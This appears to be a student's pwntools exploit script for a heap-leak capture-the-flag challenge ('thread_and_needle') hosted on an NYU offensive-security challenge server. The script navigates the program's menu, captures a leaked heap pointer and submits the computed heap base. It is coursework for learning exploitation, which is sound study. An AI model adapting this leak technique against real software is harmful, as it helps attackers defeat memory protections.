from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./thread_and_needle"

LOCAL = False

if LOCAL:
    p = process(target_file)
    # p = gdb.debug(target_file, '''
    # b main
    # continue
    # ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1211)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

# Set up the interactive functions

def menu(p, option:str):
    """
    Interact with the menu function in the binary.

    :param p: The process or remote connection to the binary.
    :param option: The menu option to select (1, 2, 3, or 4).
    """
    print(f"In menu option: {option}")
    p.recvuntil(b"What do you want to do?")
    p.recvuntil(b"> ")
    p.sendline(option.encode())

def setup(p, item:str, length:str, stitch:str):
    print(f"In setup")
    # Input for "What item are you making (max 8 characters, e.g., quilt, dress, etc.)?"
    p.recvuntil(b"What item are you making (max 8")
    p.recvuntil(b"> ")
    p.sendline(item.encode())

    # Input for "Now, set up your stitch length"
    p.recvuntil(b"Now, set up your stitch length")
    p.recvuntil(b"> ")
    p.sendline(length.encode())

    # Input for "Now, what stitch type did you land on (max 8 characters, e.g., blind hem, ladder, etc.)?"
    p.recvuntil(b"Now, what stitch type did you la")
    p.recvuntil(b"> ")
    p.sendline(stitch.encode())

    # Receive the final message
    p.recvuntil(b"Oh, that is a great choice!\n")

# Only need option 2, the stitch length
# this will leak the address of the heap address of tcache
def edit(p, option:str = "2"):
    print(f"In edit option: {option}")
    p.recvuntil(b"> ")
    p.sendline(option.encode())

    p.recvuntil(b"Stitch length: ")
    # get the address of the heap
    heap_address = int(p.recvline().strip(), 16)
    print(f'Heap address: {hex(heap_address)}')
    return heap_address & ~0xfff

def send_address(p, address:int):
    print(f"Sending address: {hex(address)}")
    # Send the address to the binary
    p.recvuntil(b"What is the heap base? Do you have any guesses?\n")
    p.sendline(str(address))

menu(p, "1")
setup(p, "quilt", "5", "zigzag")
send_address(p, 42)
menu(p, "3")
send_address(p, 42)
menu(p, "2")
leaked_heap_address = edit(p)
setup(p, "quilt", "5", "zigzag")
send_address(p, leaked_heap_address)

p.interactive()

